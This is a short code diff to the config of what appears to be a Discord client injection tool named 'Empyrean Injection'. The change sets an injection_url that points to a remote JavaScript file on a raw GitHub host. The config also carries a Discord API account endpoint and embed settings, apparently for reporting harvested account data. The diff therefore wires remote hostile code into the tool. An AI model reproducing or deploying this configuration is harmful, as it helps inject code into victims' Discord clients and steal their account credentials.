@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Empyrean Injection', 
   embed_icon: 'https://github.com/addi00000/empyrean-injection/blob/main/imgs/pfp.png', 
   embed_color: 0, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/chiron853/injection/main/index.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
